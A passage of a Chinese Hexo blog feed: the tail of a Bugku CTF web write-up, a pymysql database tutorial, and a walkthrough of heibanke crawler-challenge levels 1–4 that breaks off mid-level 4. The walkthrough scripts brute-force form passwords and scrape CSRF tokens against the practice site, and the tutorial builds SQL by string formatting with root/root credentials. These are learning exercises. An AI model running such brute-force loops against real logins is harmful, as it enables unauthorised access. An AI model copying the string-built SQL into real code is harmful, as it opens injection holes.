class="line">flag = bytes.decode(base64.b64decode(flag))</span><br><span class="line">print(<span class="string">'flag:'</span>,flag)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'margin'</span>:flag</span><br><span class="line">    &#125;</span><br><span class="line">r = s.post(url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/53.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      Bugkuctf-Web
    
    </summary>
    
      <category term="Bugkuctf-Web" scheme="https://Foxgrin.github.io/categories/Bugkuctf-Web/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Python数据库编程</title>
    <link href="https://Foxgrin.github.io//posts/21317/"/>
    <id>https://Foxgrin.github.io//posts/21317/</id>
    <published>2018-07-28T09:30:00.000Z</published>
    <updated>2018-07-28T13:21:09.556Z</updated>
    
    <content type="html"><![CDATA[<p>Python中的第三方库pymysql提供了与数据库连接并且进行交互的功能<a id="more"></a></p><h2 id="pymysql库的安装"><a href="#pymysql库的安装" class="headerlink" title="pymysql库的安装"></a>pymysql库的安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pymysql</span><br></pre></td></tr></table></figure><h2 id="pymysql库的使用"><a href="#pymysql库的使用" class="headerlink" title="pymysql库的使用"></a>pymysql库的使用</h2><p>(1)导入pymysql库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br></pre></td></tr></table></figure><p>(2)使用pymysql.connect()方法创建python客户端与数据库连接的connection对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conn = pymysql.connect(host=<span class="string">'localhost'</span>,port=<span class="number">3306</span>,user=<span class="string">'root'</span>,passwd=<span class="string">'root'</span>)</span><br></pre></td></tr></table></figure><p>connect方法中的参数：</p><p>1)host：字符串类型，表示mysql服务器地址</p><p>2)port：数字类型，表示mysql服务器端口号，默认为3306</p><p>3)user：字符串类型，表示mysql数据库用户名</p><p>4)passwd：字符串类型，表示mysql数据库密码</p><p>5)db：字符串类型，表示连接到的数据库名</p><p>6)charset：字符串类型，表示连接编码</p><p>(3)使用connection对象的cursor()方法创建于数据库交互的对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cur = conn.cursor()</span><br></pre></td></tr></table></figure><p>(4)使用cursor对象的execute()方法执行sql语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sql = <span class="string">''</span></span><br><span class="line">row = cur.execute() <span class="comment">#返回查询结果的行数</span></span><br></pre></td></tr></table></figure><p>(5)使用cursor对象的fetchone,fetchmany,fetchall方法获得查询结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = cur.fetchone() <span class="comment">#取得结果集的下一行</span></span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conn = pymysql.connect(host=<span class="string">'localhost'</span>,port=<span class="number">3306</span>,user=<span class="string">'root'</span>,passwd=<span class="string">'root'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cur = conn.cursor()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sql = <span class="string">'show databases'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>row = cur.execute(sql)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = cur.fetchone()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">(<span class="string">'information_schema'</span>,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = cur.fetchone()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">(<span class="string">'mysql'</span>,)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = cur.fetchmamy(size) <span class="comment">#取得结果集的下几行</span></span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conn = pymysql.connect(host=<span class="string">'localhost'</span>,port=<span class="number">3306</span>,user=<span class="string">'root'</span>,passwd=<span class="string">'root'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cur = conn.cursor()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sql = <span class="string">'show databases'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>row = cur.execute(sql)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = cur.fetchmany(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">((<span class="string">'information_schema'</span>,), (<span class="string">'mysql'</span>,))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = cur.fetchmany(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">((<span class="string">'performance_schema'</span>,), (<span class="string">'security'</span>,))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result = cur.fetchall() <span class="comment">#取得结果集的所有行</span></span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>conn = pymysql.connect(host=<span class="string">'localhost'</span>,port=<span class="number">3306</span>,user=<span class="string">'root'</span>,passwd=<span class="string">'root'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cur = conn.cursor()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sql = <span class="string">'show databases'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>row = cur.execute(sql)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>result = cur.fetchall()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(result)</span><br><span class="line">((<span class="string">'information_schema'</span>,), (<span class="string">'mysql'</span>,), (<span class="string">'performance_schema'</span>,), (<span class="string">'security'</span>,), (<span class="string">'test'</span>,))</span><br></pre></td></tr></table></figure><p>(6)使用cursor对象的commit()方法将修改提交到数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cur.commit()</span><br></pre></td></tr></table></figure><p>(7)关闭cursor对象和connection对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cur.close()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><h2 id="使用pymysql库实现数据库的增删改查"><a href="#使用pymysql库实现数据库的增删改查" class="headerlink" title="使用pymysql库实现数据库的增删改查"></a>使用pymysql库实现数据库的增删改查</h2><p>(1)创建新的数据库pymysql，并且创建新的数据表demo，列名分别为id,username,password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">conn = pymysql.connect(host=<span class="string">'localhost'</span>,port=<span class="number">3306</span>,user=<span class="string">'root'</span>,passwd=<span class="string">'root'</span>)</span><br><span class="line">cur = conn.cursor()</span><br><span class="line"></span><br><span class="line">createdb_sql = <span class="string">'create database pymysql'</span></span><br><span class="line">cur.execute(createdb_sql)</span><br><span class="line"></span><br><span class="line">querydb_sql = <span class="string">'show databases'</span></span><br><span class="line">cur.execute(querydb_sql)</span><br><span class="line">result = cur.fetchall()</span><br><span class="line"><span class="keyword">if</span> (<span class="string">'pymysql'</span>,) <span class="keyword">in</span> result:</span><br><span class="line">    print(<span class="string">'Database has created successfully!'</span>)</span><br><span class="line"></span><br><span class="line">selectdb_sql = <span class="string">'use pymysql'</span></span><br><span class="line">cur.execute(selectdb_sql)</span><br><span class="line">createtb_sql = <span class="string">'create table demo(id int(3),username varchar(20),password varchar(20))'</span></span><br><span class="line">cur.execute(createtb_sql)</span><br><span class="line"></span><br><span class="line">querytb_sql = <span class="string">'show tables'</span></span><br><span class="line">cur.execute(querytb_sql)</span><br><span class="line">result = cur.fetchall()</span><br><span class="line"><span class="keyword">if</span> (<span class="string">'demo'</span>,) <span class="keyword">in</span> result:</span><br><span class="line">    print(<span class="string">'Table has created successfully!'</span>)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/python数据库编程/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>mysql命令行中查询：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/python数据库编程/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>(2)向demo表中添加修改数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">conn = pymysql.connect(host=<span class="string">'localhost'</span>,port=<span class="number">3306</span>,user=<span class="string">'root'</span>,passwd=<span class="string">'root'</span>)</span><br><span class="line">cur = conn.cursor()</span><br><span class="line"></span><br><span class="line">selectdb_sql = <span class="string">'use pymysql'</span></span><br><span class="line">cur.execute(selectdb_sql)</span><br><span class="line"></span><br><span class="line">data = [[<span class="number">1</span>,<span class="string">'admin1'</span>,<span class="string">'admin1'</span>],[<span class="number">2</span>,<span class="string">'admin2'</span>,<span class="string">'admin2'</span>],[<span class="number">3</span>,<span class="string">'admin3'</span>,<span class="string">'admin3'</span>]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    ID = i[<span class="number">0</span>]</span><br><span class="line">    username = i[<span class="number">1</span>]</span><br><span class="line">    password = i[<span class="number">2</span>]</span><br><span class="line">    insert_sql = <span class="string">"insert into demo values(%d,'%s','%s')"</span>%(ID,username,password)</span><br><span class="line">    cur.execute(insert_sql)</span><br><span class="line"></span><br><span class="line">query_sql = <span class="string">'select * from demo'</span></span><br><span class="line">cur.execute(query_sql)</span><br><span class="line">result = cur.fetchall()</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">update_sql = <span class="string">"update demo set username='somnus',password='somnus' where id=3"</span></span><br><span class="line">cur.execute(update_sql)</span><br><span class="line">cur.execute(query_sql)</span><br><span class="line">result = cur.fetchall()</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">cur.close()</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/python数据库编程/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>(3)删除列，表，库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">conn = pymysql.connect(host=<span class="string">'localhost'</span>,port=<span class="number">3306</span>,user=<span class="string">'root'</span>,passwd=<span class="string">'root'</span>,db=<span class="string">'pymysql'</span>)</span><br><span class="line">cur = conn.cursor()</span><br><span class="line"></span><br><span class="line">deletecu_sql = <span class="string">"delete from demo where id=1"</span></span><br><span class="line">cur.execute(deletecu_sql)</span><br><span class="line">query_sql = <span class="string">'select * from demo where id=1'</span></span><br><span class="line"><span class="keyword">if</span> cur.execute(query_sql) == <span class="number">0</span>:</span><br><span class="line">    print(<span class="string">'column 1 has deleted'</span>)</span><br><span class="line"></span><br><span class="line">deletetb_sql = <span class="string">"drop table demo"</span></span><br><span class="line">cur.execute(deletetb_sql)</span><br><span class="line">query_sql = <span class="string">'show tables'</span></span><br><span class="line"><span class="keyword">if</span> cur.execute(query_sql) == <span class="number">0</span>:</span><br><span class="line">    print(<span class="string">'table has deleted'</span>)</span><br><span class="line"></span><br><span class="line">deletedb_sql = <span class="string">"drop database pymysql"</span></span><br><span class="line">cur.execute(deletedb_sql)</span><br><span class="line">query_sql = <span class="string">'show databases'</span></span><br><span class="line">cur.execute(query_sql)</span><br><span class="line">result = cur.fetchall()</span><br><span class="line"><span class="keyword">if</span> (<span class="string">'pymysql'</span>,) <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">    print(<span class="string">'database has deleted'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      Python学习笔记
    
    </summary>
    
      <category term="Python学习笔记" scheme="https://Foxgrin.github.io/categories/Python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Python" scheme="https://Foxgrin.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>黑板客爬虫闯关(1-5)</title>
    <link href="https://Foxgrin.github.io//posts/18564/"/>
    <id>https://Foxgrin.github.io//posts/18564/</id>
    <published>2018-07-26T08:34:00.000Z</published>
    <updated>2018-07-26T14:40:26.906Z</updated>
    
    <content type="html"><![CDATA[<p>昨天偶然间发现了一个爬虫的闯关网站，就赶紧来用它练一练爬虫，今天总算是将五个关卡都通关了，其中也碰到不少坑，通过百度借鉴别人的思路代码也都慢慢解决了，学到了很多，下面就附上五个关卡的思路和代码<a id="more"></a></p><h2 id="Pass-1"><a href="#Pass-1" class="headerlink" title="Pass-1"></a>Pass-1</h2><p>网址：<a href="http://www.heibanke.com/lesson/crawler_ex00/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex00/</a></p><p>首先页面给的提示是要我们在网址后面输入数字73618</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>访问<a href="http://www.heibanke.com/lesson/crawler_ex00/73618/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex00/73618/</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>页面又提示要输入数字53825</p><p>访问<a href="http://www.heibanke.com/lesson/crawler_ex00/53825/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex00/53825/</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>又提示要输入数字，于是推测这关要一直输入到某个数字后才能得到最后结果</p><p>那么我们可以将每个提示页面的数字，即下一个要输入的数字爬取下来，与原来的url构成一个下一个要访问的url，再继续爬取数字，假如爬取不到数字，就猜测可能得到了最后的结果</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.heibanke.com/lesson/crawler_ex00/'</span></span><br><span class="line">num = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    next_url = url+num</span><br><span class="line">    print(next_url)</span><br><span class="line">    r = requests.get(next_url)</span><br><span class="line">    match = re.search(<span class="string">r'数字.*(\d&#123;5&#125;)'</span>,r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> match:</span><br><span class="line">        print(<span class="string">'You have found the last number!'</span>)</span><br><span class="line">        print(<span class="string">'The last number is:'</span>,str(num))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    num = match.group(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这里通过正则匹配出下一个要输入的数字，然后与网页原本的url拼成下一个要访问的url，当匹配不到数字时退出循环</p><p>运行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>猜测69428是最后输入的数字，我们访问一下<a href="http://www.heibanke.com/lesson/crawler_ex00/69428/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex00/69428/</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>果然，页面提示了通关，点击下一关按钮，进入到第二关的页面</p><h2 id="Pass-2"><a href="#Pass-2" class="headerlink" title="Pass-2"></a>Pass-2</h2><p>网址：<a href="http://www.heibanke.com/lesson/crawler_ex01/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex01/</a></p><p>首先根据页面提示，我们需要在表单中输入一个用户名和密码，用户名可以随机输入，密码则是1到30之间的数字</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们先来看一下源代码中的表单部分</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出表单是以POST形式提交的，提交的参数为username和password，还会提交一个隐藏的token值，看到token值，我们的第一反应都是要先获取到页面的token值，与数据一起提交，但是经过测试，这关后台服务器并没有对token值进行检测，也就是说我们在程序中并不需要提交这个token值，也可以提交成功，既然不用管token，那么这关就很简单了</p><p>我们先随意提交一个用户名aaa和密码1看看提示是什么</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到页面提示”您输入的密码错误”，说明这是输入错误的提示信息，那么思路就很清晰了，我们依次提交数值为1-30之间的密码值，然后根据页面的提示信息是否包含”您输入的密码错误”，如果没有则可能是正确的密码</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.heibanke.com/lesson/crawler_ex01/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">31</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'aaa'</span>,</span><br><span class="line">        <span class="string">'password'</span>:i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'提交'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r = requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'您输入的密码错误'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(<span class="string">'Correct password:'</span>,str(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'Wrong password:'</span>,str(i))</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>说明20可能是正确的密码，我们在浏览器中提交</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>闯关成功，继续点击下一关按钮进入第三关</p><h2 id="Pass-3"><a href="#Pass-3" class="headerlink" title="Pass-3"></a>Pass-3</h2><p>网址：<a href="http://www.heibanke.com/lesson/crawler_ex02/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex02/</a></p><p>我们会发现自动跳转到了登录页面，也就是说这一关需要模拟登录</p><p>我们先注册一个账号和密码登录进去</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>看起来和上一关没什么区别，一样是输入用户名和密码，用户名是随意的，密码还是1-30之间的数字，唯一区别在于页面提示比上一关多了两层保护，光看这句话还是很懵逼的，没事，我们看一看页面源代码，就可以大致猜到到底是什么保护了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出表单提交了隐藏的token值，猜测这关服务器会对token值进行检测</p><p>再回到登录页面，查看源代码的表单部分</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>登录页面也有一个token值</p><p>所以思路是这样的，我们首先需要模拟登录，这就需要用到requests库的Session方法保持一个会话记录，否则我们再次访问这关的页面依旧会跳转到登录页面，然后我们还需要爬取页面信息的token值，也就是提交token的input标签的value值</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">login_url = <span class="string">'http://www.heibanke.com/accounts/login/?next=/lesson/crawler_ex02/'</span></span><br><span class="line">pass_url = <span class="string">'http://www.heibanke.com/lesson/crawler_ex02/'</span></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getToken</span><span class="params">(html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html,<span class="string">'html.parser'</span>)</span><br><span class="line">    token = soup.find_all(<span class="string">'input'</span>)[<span class="number">0</span>][<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    r = s.get(url=login_url)</span><br><span class="line">    login_token = getToken(r.text)</span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">'csrfmiddlewaretoken'</span>:login_token,</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'xxx'</span>, <span class="comment">#替换成自己的用户名</span></span><br><span class="line">        <span class="string">'password'</span>:<span class="string">'xxx'</span>  <span class="comment">#替换成自己的密码</span></span><br><span class="line">        &#125;</span><br><span class="line">    login = s.post(url=login_url,data=login_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'这里是黑板客爬虫闯关的第三关'</span> <span class="keyword">in</span> login.text:</span><br><span class="line">        print(<span class="string">'login successfully!'</span>)</span><br><span class="line">    pass_token = getToken(login.text)</span><br><span class="line">    <span class="keyword">return</span> pass_token</span><br><span class="line">    </span><br><span class="line">pass_token = login()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'csrfmiddlewaretoken'</span>:pass_token,</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'aaa'</span>,</span><br><span class="line">        <span class="string">'password'</span>:i</span><br><span class="line">        &#125;</span><br><span class="line">    result = s.post(url=pass_url,data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'您输入的密码错误'</span> <span class="keyword">not</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        print(<span class="string">'------Correct password:'</span>,str(i))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'fail to pass'</span>)</span><br></pre></td></tr></table></figure><p>这里用了BeautifulSoup库的find_all方法获得所有input标签组成的列表，观察出token值所在的input标签是列表的第一个元素，就可以通过索引获得token值，登录成功后还要继续抓取关卡页面的token值，与用户名和密码一起提交</p><p>最后的运行结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>在浏览器中提交用户名：aaa，密码：4</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>闯关成功，此处后台代码有误，点击下一关还是第三关的页面，但是我们可以根据前面几关的url推测出第四关的url：<a href="http://www.heibanke.com/lesson/crawler_ex03/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex03/</a></p><h2 id="Pass-4"><a href="#Pass-4" class="headerlink" title="Pass-4"></a>Pass-4</h2><p>网址：<a href="http://www.heibanke.com/lesson/crawler_ex03/" target="_blank" rel="noopener">http://www.heibanke.com/lesson/crawler_ex03/</a></p><p>跟第三关一样，还是需要先登录</p><p>登录后来到第四关关卡页面</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/黑板客爬虫闯关/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            